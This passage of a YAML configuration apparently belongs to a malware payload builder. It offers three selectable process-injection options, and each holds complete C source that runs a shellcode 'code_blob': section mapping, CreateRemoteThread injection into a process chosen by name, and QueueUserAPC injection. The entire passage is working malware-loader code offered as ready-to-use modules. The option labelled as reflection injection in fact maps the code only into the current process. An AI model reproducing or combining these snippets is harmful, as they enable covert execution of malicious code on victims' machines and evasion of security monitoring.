      // No process injection
  - id: MpfProcessInjectionViaProcessReflection
    display: Process Reflection Injection
    default: false
    snippet: "// Process injection via NtCreateSection + NtMapViewOfSection\n{\n    typedef NTSTATUS (NTAPI *pNtCS)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);\n    typedef NTSTATUS (NTAPI *pNtMVOS)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);\n    HMODULE ntdll = GetModuleHandleA(\"ntdll.dll\");\n    pNtCS NtCS = (pNtCS)GetProcAddress(ntdll, \"NtCreateSection\");\n    pNtMVOS NtMVOS = (pNtMVOS)GetProcAddress(ntdll, \"NtMapViewOfSection\");\n    if (NtCS && NtMVOS) {\n        HANDLE hSection = NULL;\n        LARGE_INTEGER secSize = {0};\n        secSize.QuadPart = code_blob_len;\n        if (NtCS(&hSection, SECTION_ALL_ACCESS, NULL, &secSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) >= 0) {\n            PVOID localBase = NULL;\n            SIZE_T viewSize = 0;\n            NtMVOS(hSection, GetCurrentProcess(), &localBase, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);\n            if (localBase) {\n                memcpy(localBase, code_blob, code_blob_len);\n                PVOID remoteBase = NULL;\n                SIZE_T remoteSize = 0;\n                NtMVOS(hSection, GetCurrentProcess(), &remoteBase, 0, 0, NULL, &remoteSize, 2, 0, PAGE_EXECUTE_READ);\n                if (remoteBase) {\n                    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)remoteBase, NULL, 0, NULL);\n                    if (hThread) { WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); }\n                }\n            }\n            CloseHandle(hSection);\n        }\n    }\n}\n"
  - id: ClassicRemoteThread
    display: Classic Remote Thread Injection
    default: false
    snippet: "// Classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread\n{\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (hSnap != INVALID_HANDLE_VALUE) {\n        PROCESSENTRY32W pe32 = {sizeof(pe32)};\n        DWORD targetPid = 0;\n        if (Process32FirstW(hSnap, &pe32)) {\n            do {\n                if (_wcsicmp(pe32.szExeFile, L\"$psname$\") == 0) {\n                    targetPid = pe32.th32ProcessID;\n                    break;\n                }\n            } while (Process32NextW(hSnap, &pe32));\n        }\n        CloseHandle(hSnap);\n        \n        if (targetPid) {\n            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);\n            if (hProc) {\n                LPVOID remoteMem = VirtualAllocEx(hProc, NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n                if (remoteMem) {\n                    SIZE_T written;\n                    if (WriteProcessMemory(hProc, remoteMem, code_blob, code_blob_len, &written)) {\n                        HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);\n                        if (hThread) {\n                            WaitForSingleObject(hThread, INFINITE);\n                            CloseHandle(hThread);\n                        }\n                    }\n                }\n                CloseHandle(hProc);\n            }\n        }\n    }\n}\n"
  - id: QueueUserAPC
    display: QueueUserAPC Injection
    default: false
    snippet: "// QueueUserAPC injection into target process\n{\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);\n    if (hSnap != INVALID_HANDLE_VALUE) {\n        PROCESSENTRY32W pe32 = {sizeof(pe32)};\n        DWORD targetPid = 0;\n        if (Process32FirstW(hSnap, &pe32)) {\n            do {\n                if (_wcsicmp(pe32.szExeFile, L\"$psname$\") == 0) {\n                    targetPid = pe32.th32ProcessID;\n                    break;\n                }\n            } while (Process32NextW(hSnap, &pe32));\n        }\n        \n        if (targetPid) {\n            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);\n            if (hProc) {\n                LPVOID remoteMem = VirtualAllocEx(hProc, NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n                if (remoteMem) {\n                    SIZE_T written;\n                    if (WriteProcessMemory(hProc, remoteMem, code_blob, code_blob_len, &written)) {\n                        THREADENTRY32 te32 = {sizeof(te32)};\n                        if (Thread32First(hSnap, &te32)) {\n                            do {\n                                if (te32.th32OwnerProcessID == targetPid) {\n                                    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);\n                                    if (hThread) {\n                                        QueueUserAPC((PAPCFUNC)remoteMem, hThread, 0);\n                                        CloseHandle(hThread);\n                                    }\n                                }\n                            } while (Thread32Next(hSnap, &te32));\n                        }\n                    }\n                }\n                CloseHandle(hProc);\n            }\n        }\n        CloseHandle(hSnap);\n    }\n}\n"
